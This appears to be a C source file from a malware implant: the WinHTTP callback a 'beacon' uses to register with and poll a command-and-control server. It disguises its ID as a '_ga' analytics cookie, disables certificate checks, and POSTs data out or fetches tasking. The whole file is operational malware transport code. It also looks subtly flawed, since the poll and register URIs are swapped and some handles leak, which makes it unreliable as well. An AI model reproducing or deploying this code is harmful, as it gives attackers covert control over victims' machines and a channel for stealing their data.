#include "pch.h"
#include "api.h"
#include "beacon.h"
#include "transport.h"

extern API g_Api;
extern PWCHAR g_lpwId;
extern PROFILE g_Profile;

LPVOID
HttpCallback(
    LPCWSTR lpwHostname,
    BOOL bSendMode,
    DWORD dwCbMode,
    LPVOID lpBuffer,
    DWORD dwLen
)
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;

    hSession = g_Api.WinHttpOpen(
        g_Profile.lpwUserAgent + 1,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    if (!hSession)
    {
        return NULL;
    }

    BOOL bStatus = g_Api.WinHttpSetTimeouts(
        hSession,
        g_Profile.dwCallbackTimeout,
        g_Profile.dwCallbackTimeout,
        g_Profile.dwCallbackTimeout,
        g_Profile.dwCallbackTimeout
    );

    if (!bStatus)
    {
        return NULL;
    }

    hConnect = g_Api.WinHttpConnect(
        hSession,
        lpwHostname,
        443,
        0
    );

    if (!hConnect)
    {
        g_Api.WinHttpCloseHandle(hSession);

        return NULL;
    }

    LPCWSTR lpwUri = NULL;

    if ( dwCbMode == C2_POLL ) { lpwUri = g_Profile.lpwRegister + 1; }
    if ( dwCbMode == C2_REGISTER ) { lpwUri = g_Profile.lpwPoll + 1; }

    hRequest = g_Api.WinHttpOpenRequest(
        hConnect,
        bSendMode ? L"POST" : L"GET",
        lpwUri,
        NULL,
        NULL,
        NULL,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE
    );

    if (!hRequest)
    {
        g_Api.WinHttpCloseHandle(hSession);
        g_Api.WinHttpCloseHandle(hConnect);

        return NULL;
    }

    if (g_lpwId != NULL)
    {

        // TODO: make sure to set the cookie name in the profle
        PWCHAR lpwCookie = HeapAlloc(
            GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            (wcslen(L"Cookie: _ga=") + wcslen(g_lpwId)) * 4
        );

        wcscpy(
            lpwCookie,
            L"Cookie: _ga="
        );

        wcscat(
            lpwCookie,
            g_lpwId
        );

        bStatus = g_Api.WinHttpAddRequestHeaders(
            hRequest,
            (LPCWSTR)lpwCookie,
            wcslen(lpwCookie),
            WINHTTP_ADDREQ_FLAG_COALESCE
        );

        if (!bStatus)
        {
            g_Api.WinHttpCloseHandle(hSession);
            g_Api.WinHttpCloseHandle(hConnect);

            return NULL;
        }
    }

    bStatus = g_Api.WinHttpAddRequestHeaders(
        hRequest,
        (LPCWSTR)L"Connection: close",
        wcslen(L"Connection: close"),
        WINHTTP_ADDREQ_FLAG_COALESCE
    );

    if (!bStatus)
    {
        g_Api.WinHttpCloseHandle(hSession);
        g_Api.WinHttpCloseHandle(hConnect);

        return NULL;
    }

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

    bStatus = g_Api.WinHttpSetOption(
        hRequest,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &dwFlags,
        sizeof(dwFlags)
    );

    if (!bStatus)
    {
        goto CLEANUP;
    }

    bStatus = g_Api.WinHttpSendRequest(
        hRequest,
        bSendMode ? L"Content-Type: application/x-www-form-urlencoded\r\n" : WINHTTP_NO_ADDITIONAL_HEADERS,
        bSendMode ? -1 : 0,
        bSendMode ? lpBuffer : WINHTTP_NO_REQUEST_DATA,
        bSendMode ? dwLen : 0,
        bSendMode ? dwLen : 0,
        0
    );

    if (!bStatus)
    {
        goto CLEANUP;
    }

    bStatus = g_Api.WinHttpReceiveResponse(
        hRequest,
        NULL
    );

    if (!bStatus)
    {
        goto CLEANUP;
    }

    DWORD dwSize = 0;
    DWORD dwPtrEnd = 0;
    DWORD dwLstRecv = 0;
    PCHAR lpData = NULL;

    do
    {
        bStatus = g_Api.WinHttpQueryDataAvailable(
            hRequest,
            &dwSize
        );

        if (!bStatus) { goto CLEANUP; }

        PCHAR lpTempData = HeapAlloc(
            GetProcessHeap(),
            HEAP_ZERO_MEMORY,
            dwSize * 2
        );

        if (!lpTempData) { goto CLEANUP; }

        DWORD dwRecv = 0;

        bStatus = g_Api.WinHttpReadData(
            hRequest,
            lpTempData,
            dwSize,
            &dwRecv
        );

        if (!bStatus) { goto CLEANUP; }

        lpTempData[dwRecv] = '\0';

        dwLstRecv = dwPtrEnd;

        if (dwRecv > 0)
        {
            if (lpData == NULL)
            {
                lpData = HeapAlloc(
                    GetProcessHeap(),
                    HEAP_ZERO_MEMORY,
                    dwRecv * 2
                );

                if (!lpData) { goto CLEANUP; }

                dwPtrEnd += dwRecv;
            } else
            {
                lpData = HeapReAlloc(
                    GetProcessHeap(),
                    HEAP_ZERO_MEMORY,
                    lpData,
                    dwPtrEnd + (dwRecv * 2)
                );

                if (!lpData) { goto CLEANUP; }

                dwPtrEnd += dwRecv;
            }

            memcpy(
                lpData + dwLstRecv,
                lpTempData,
                dwRecv
            );

            ZeroMemory(
                lpTempData,
                dwRecv
            );

            bStatus = HeapFree(
                GetProcessHeap(),
                HEAP_NO_SERIALIZE,
                lpTempData
            );

            if (!bStatus) { goto CLEANUP; }
        }

    } while (dwSize > 0);

    g_Api.WinHttpCloseHandle(hRequest);
    g_Api.WinHttpCloseHandle(hSession);
    g_Api.WinHttpCloseHandle(hConnect);

    return (LPVOID)lpData;

CLEANUP:
    g_Api.WinHttpCloseHandle(hRequest);
    g_Api.WinHttpCloseHandle(hSession);
    g_Api.WinHttpCloseHandle(hConnect);

    return NULL;

}
